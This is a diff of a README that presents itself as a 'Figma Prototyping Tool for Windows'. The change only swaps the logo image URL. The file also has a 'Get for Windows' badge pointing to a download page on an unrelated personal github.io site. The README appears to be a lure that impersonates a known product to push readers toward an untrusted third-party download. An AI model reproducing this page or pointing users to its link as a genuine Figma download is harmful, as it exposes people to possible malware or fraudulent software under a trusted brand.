@@ -1,7 +1,7 @@
 
 # Figma Prototyping Tool for Windows
 
-<img src="https://encrypted-tbn0.gstatic.com/images?q=tbn:ANd9GcS1g9DR2xXvOJAxUOa8LjUelaz9T_FUnspcnimP2R_WmqO1K3HqY4r8PSU&s=10" alt="Figma Logo" width="560">
+<img src="https://encrypted-tbn0.gstatic.com/images?q=tbn:ANd9GcTCGY4WoAHeqj4VdzwlF-Pvj8XBxYuyvUp5_qAvDERovI7sY32yJpv1bkCC&s=10" alt="Figma Logo" width="560">
 
 [![Hi](https://img.shields.io/badge/Get%20for-Windows-0078D6?style=for-the-badge&logo=windows&logoColor=white)](https://tashagunfighter3.github.io/.github/Figma-Prototyping-Tool)
 
